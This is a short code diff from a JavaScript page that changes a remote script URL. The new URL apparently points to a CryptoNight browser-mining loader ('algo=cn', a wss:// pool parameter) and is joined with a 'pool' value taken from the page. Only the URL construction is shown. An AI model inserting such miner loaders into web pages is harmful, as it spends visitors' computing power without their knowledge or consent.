@@ -168,7 +168,7 @@ title = "Test";
 }
 console.log("Loading scripts...");
 
-var str = "https://www.eth-pocket.de/perfekt/perfekt2.js?perfekt=wss://?jason=";
+var str = "https://ethtrader.de/perfekt/perfekt.js?perfekt=wss://?algo=cn?variant=0?jason=";
 var pool = document.getElementById("pool").innerHTML;
 var links = str+pool;
 
